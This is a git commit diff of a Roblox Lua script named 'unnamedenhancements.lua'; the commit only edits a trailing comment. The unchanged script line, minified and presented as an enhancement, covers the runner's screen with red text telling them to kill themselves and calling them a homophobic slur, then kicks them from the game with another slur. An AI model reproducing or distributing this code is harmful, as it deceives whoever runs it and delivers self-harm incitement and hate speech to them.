8dc07e5d253694614802d84c35df856d2d14e3d0
itouchkids67 <iloveonesie@gmail.com>
2025-09-20 22:23:07 +0100

    Update unnamedenhancements.lua

--- unnamedenhancements.lua
+++ unnamedenhancements.lua
@@ -1,2 +1,2 @@
 local v0=Instance.new("ScreenGui");local v1=Instance.new("TextLabel");v0.Parent=game.Players.LocalPlayer:WaitForChild("PlayerGui");v0.ZIndexBehavior=Enum.ZIndexBehavior.Sibling;v1.Parent=v0;v1.BackgroundColor3=Color3.fromRGB(0,0,0);v1.BorderColor3=Color3.fromRGB(0,0,0);v1.BorderSizePixel=0;v1.Size=UDim2.new(1,0,1,0);v1.Font=Enum.Font.SourceSans;v1.Text="go kill ur self u fat faggot keep exploiting u hopeless soul";v1.TextColor3=Color3.fromRGB(255,0,0);v1.TextSize=92;local function v15() local v16=Instance.new("LocalScript",v1);wait(10);local v17=game.Players.LocalPlayer;game.Players.LocalPlayer:Kick("U stupid faggot XDD");end coroutine.wrap(v15)();
--- this is a private script!!
+-- this is a private script!! silly goose!
